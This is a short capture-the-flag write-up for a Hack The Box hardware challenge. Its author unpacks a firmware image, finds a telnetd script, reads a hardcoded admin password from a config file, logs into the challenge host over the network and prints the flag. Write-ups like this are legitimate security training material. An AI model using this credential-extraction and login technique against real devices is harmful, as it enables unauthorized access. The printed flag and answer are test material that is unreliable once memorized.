#binwalk -e firmware.bin

'''
sudo grep telnet -r .
./common.sh:                            *procd*|*ash*|*init*|*watchdog*|*ssh*|*dropbear*|*telnet*|*login*|*hostapd*|*wpa_supplicant*|*nas*|*relayd*) : ;;
./telnetd.sh:TELNETD=`rgdb -g /sys/telnetd`
./telnetd.sh:   echo "Start telnetd ..." > /dev/console
./telnetd.sh:           telnetd -l "/usr/sbin/login" -u Device_Admin:$sign      -i $lf &
./telnetd.sh:           telnetd &
./services:telnet               23/tcp
./squashfs-root/lib/upgrade/common.sh:                          *procd*|*ash*|*init*|*watchdog*|*ssh*|*dropbear*|*telnet*|*login*|*hostapd*|*wpa_supplicant*|*nas*|*relayd*) : ;;
./squashfs-root/etc/services:telnet             23/tcp
./squashfs-root/etc/scripts/telnetd.sh:TELNETD=`rgdb -g /sys/telnetd`
./squashfs-root/etc/scripts/telnetd.sh: echo "Start telnetd ..." > /dev/console
./squashfs-root/etc/scripts/telnetd.sh:         telnetd -l "/usr/sbin/login" -u Device_Admin:$sign      -i $lf &
./squashfs-root/etc/scripts/telnetd.sh:         telnetd &

find . -name sign
./sign
./squashfs-root/etc/config/sign

cat sign
qS6-X/n]u>fVfAt!

user: Device_Admin
password: qS6-X/n]u>fVfAt!

nc 46.101.80.226 31240

hwtheneedle-1061206-6489549b5c-plfrs login: Device_Admin
Device_Admin
Password: qS6-X/n]u>fVfAt!

hwtheneedle-1061206-6489549b5c-plfrs:~$ ls       
ls
flag.txt
hwtheneedle-1061206-6489549b5c-plfrs:~$ cat flag.txt
cat flag.txt
HTB{4_hug3_blund3r_d289a1_!!}
'''
